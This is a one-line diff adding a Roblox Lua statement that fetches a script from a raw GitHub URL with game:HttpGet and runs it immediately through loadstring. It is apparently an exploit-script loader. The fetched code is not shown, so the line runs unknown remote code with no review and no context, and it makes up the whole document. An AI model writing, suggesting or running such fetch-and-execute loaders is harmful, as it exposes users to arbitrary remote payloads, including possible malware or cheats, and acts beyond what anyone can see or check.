@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CrystalManMan/crystacentral/main/2ndnewloadstringlol", true))()
